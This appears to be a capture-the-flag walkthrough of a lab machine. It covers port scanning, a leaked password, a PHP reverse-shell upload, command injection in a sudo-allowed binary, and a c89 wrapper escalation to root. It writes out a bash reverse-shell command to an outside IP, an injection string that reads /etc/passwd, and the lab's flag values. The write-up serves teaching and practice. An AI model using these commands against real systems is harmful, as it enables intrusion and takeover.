# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 80 | HTTP |
| 7777 | HTTP |

```
PORT STATE SERVICE REASON VERSION
80/tcp open http syn-ack Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Security Verification Tool
7777/tcp open http syn-ack SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
|_http-title: Directory listing for /
| http-methods:
|_ Supported Methods: GET HEAD
```




# RECONNAISSANCE
---

We got two web applications, let's check them up:

![Pasted image 20250604161212.png](../../IMAGES/Pasted%20image%2020250604161212.png)


![Pasted image 20250604161237.png](../../IMAGES/Pasted%20image%2020250604161237.png)

As seen, on port `7777` we got some important stuff, for example, on here, we got `id_rsa` inside of `.ssh` but the file is empty, we can also find this:

![Pasted image 20250604162256.png](../../IMAGES/Pasted%20image%2020250604162256.png)


![Pasted image 20250604162307.png](../../IMAGES/Pasted%20image%2020250604162307.png)

If we analyze the `history.txt` file, we can find this section:


```
una pequeÃƒ±a pero crÃƒ­tica vulnerabilidad en el protocolo de encriptaciÃƒ³n utilizado. Con una mezcla de astucia y tÃƒ©cnica avanzada, pudo realizar un ataque sofisticado que permitiÃƒ³ descifrar el contenido protegido bajo el "super_secure_password".
```

On the other web application on port `80`, we need a keyword to enter, we can try:

```
super_secure_password
```

Let's check:

![Pasted image 20250604162541.png](../../IMAGES/Pasted%20image%2020250604162541.png)


![Pasted image 20250604162547.png](../../IMAGES/Pasted%20image%2020250604162547.png)

![Pasted image 20250604162554.png](../../IMAGES/Pasted%20image%2020250604162554.png)

There we go, we were able to get into the panel, let's proceed with exploitation.



# EXPLOITATION
---

We are dealing with a site in which we can create configuration files and save them, then we can execute remote configuration files, the issue on this site is that we can use `.php` files as configuration files too, meaning, we can inject a reverse shell on here, let's do it:



![Pasted image 20250604163713.png](../../IMAGES/Pasted%20image%2020250604163713.png)


Now, we need to fetch the configuration and have our listener ready:


![Pasted image 20250604163800.png](../../IMAGES/Pasted%20image%2020250604163800.png)

![Pasted image 20250604163804.png](../../IMAGES/Pasted%20image%2020250604163804.png)

There we go, as seen, without proper sanitization and control over the files, we can get ourselves a reverse shell. 

Let's proceed with PRIVESC.


# PRIVILEGE ESCALATION
---


Since we already got a shell, first step is to stabilize it:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250604163927.png](../../IMAGES/Pasted%20image%2020250604163927.png)

Ok, let's look around, we can use linpeas:

![Pasted image 20250604164147.png](../../IMAGES/Pasted%20image%2020250604164147.png)

![Pasted image 20250604164240.png](../../IMAGES/Pasted%20image%2020250604164240.png)

Let's check the `codebad` user's home:

```
www-data@ac11496ac62b:/tmp$ ls -la /home/codebad/
total 32
drwxr-xr-x 1 codebad codebad 100 Aug 29 2024 .
drwxr-xr-x 1 root root 42 Aug 29 2024 ..
-rw------- 1 codebad codebad 5 Aug 29 2024 .bash_history
-rw-r--r-- 1 codebad codebad 220 Aug 29 2024 .bash_logout
-rw-r--r-- 1 codebad codebad 3771 Aug 29 2024 .bashrc
-rw-r--r-- 1 codebad codebad 807 Aug 29 2024 .profile
-rwxr-xr-x 1 metadata metadata 16176 Aug 29 2024 code
drwxr-xr-x 1 root root 22 Aug 29 2024 secret
```

```
www-data@ac11496ac62b:/home/codebad/secret$ cat adivina.txt

Adivinanza

En el mundo digital, donde la protecciÃ³n es vital,
existe algo peligroso que debes evitar.
No es un virus comÃºn ni un simple error,
sino algo mÃ¡s sutil que trabaja con ardor.

Es el arte de lo malo, en el software es su reino,
se oculta y se disfraza, su propÃ³sito es el mismo.
No es virus, ni gusano, pero se comporta igual,
toma su nombre de algo que no es nada normal.

¿QuÃ© soy?
```

The answer for this would be `troyano` or `trojan` in english, we also got a binary named `code` on here, a good approach would be analyzing it with `ghidra`:


![Pasted image 20250604165318.png](../../IMAGES/Pasted%20image%2020250604165318.png)

![Pasted image 20250604165325.png](../../IMAGES/Pasted%20image%2020250604165325.png)

We got a nice approach on how to get root access, the binary basically expects exactly one argument (besides the binary name). If you pass one argument, it calls `execute_command(arg)`. Otherwise, it just prints a usage message and exits.

This matters because this binary is vulnerable to `command injection`, 

```
snprintf(buf, 0x100, "%s %s", "/bin/ls", param_1)
```

Simply concatenates `"/bin/ls"` and `param_1` (without any sanitization), we can put shell metacharacters (like `;`, `&&`, `|`, etc.) in `param_1` to chain commands.

First of all, we can migrate from `www-data` to `codebase` using the password `malware`, this seem to be the right answer from the riddle, which is weird because it should be trojan but since trojan is a type of malware, it makes sense.

![Pasted image 20250604165614.png](../../IMAGES/Pasted%20image%2020250604165614.png)

Now, let's go to testing the command injection, we already know how it works, so, we can simply try this:

```
./code ";cat /etc/passwd"
```

![Pasted image 20250604165646.png](../../IMAGES/Pasted%20image%2020250604165646.png)

As seen, it works, let's start a listener and send ourselves a reverse shell, if we check our sudo -l permissions, we can check this:


```
codebad@ac11496ac62b:~$ sudo -l
Matching Defaults entries for codebad on ac11496ac62b:
 env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
 use_pty

User codebad may run the following commands on ac11496ac62b:
 (metadata : metadata) NOPASSWD: /home/codebad/code
```

Knowing this, we can receive a shell as metadata with:

```
sudo -u metadata /home/codebad/code "; /bin/bash -c 'bash -i >& /dev/tcp/192.168.200.136/9001 0>&1'"
```

![Pasted image 20250604170308.png](../../IMAGES/Pasted%20image%2020250604170308.png)

Nice, we got a shell as this user, let's stabilize it first:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250604170531.png](../../IMAGES/Pasted%20image%2020250604170531.png)

Got our first flag:

```
metadata@ac11496ac62b:~$ cat user.txt
f5d22841e337cab01739e59cce3275e9
```

We also got another file named `pass.txt` owned by root:

```
metadata@ac11496ac62b:~$ ls -la
total 24
drwxr-x--- 1 metadata metadata 112 Aug 29 2024 .
drwxr-xr-x 1 root root 14 Aug 29 2024 ..
-rw------- 1 metadata metadata 5 Aug 29 2024 .bash_history
-rw-r--r-- 1 metadata metadata 220 Aug 29 2024 .bash_logout
-rw-r--r-- 1 metadata metadata 3771 Aug 29 2024 .bashrc
-rw-r--r-- 1 metadata metadata 807 Aug 29 2024 .profile
-rw------- 1 root root 15 Aug 29 2024 pass.txt
-rw------- 1 metadata metadata 33 Aug 29 2024 user.txt
```

We cannot read this file, let's use linpeas again then:

![Pasted image 20250604171039.png](../../IMAGES/Pasted%20image%2020250604171039.png)

Inside of `/usr/local/bin`, we can find:

```
metadata@ac11496ac62b:/tmp$ ls -la /usr/local/bin
total 4
drwxr-x--- 1 metadata metadata 28 Aug 29 2024 .
drwxr-xr-x 1 root root 16 Aug 1 2024 ..
-rwxr-xr-x 1 root root 79 Aug 29 2024 metadatosmalos
```

We got something called `metadatosmalos`

```
metadata@ac11496ac62b:/tmp$ cat /usr/local/bin/metadatosmalos
#!/bin/bash

#chmod u+s /bin/bash

whoami | grep 'pass.txt'

# metadata is bad
```

Weird, maybe `metadatosmalos` is the password for the metadata user, let's use sudo to check:

![Pasted image 20250604171223.png](../../IMAGES/Pasted%20image%2020250604171223.png)

Yes, it worked, as seen we can run sudo with `/usr/bin/c89`, let's check this out on GTFOBINS:

![Pasted image 20250604171418.png](../../IMAGES/Pasted%20image%2020250604171418.png)

![Pasted image 20250604171501.png](../../IMAGES/Pasted%20image%2020250604171501.png)

So, we can do:


```
sudo /usr/bin/c89 -wrapper /bin/sh,-s .
```

![Pasted image 20250604171534.png](../../IMAGES/Pasted%20image%2020250604171534.png)

There we go, we got root access:

```
# cat /root/root.txt
d6c4a33bec66ea2948f09a0db32335de
```

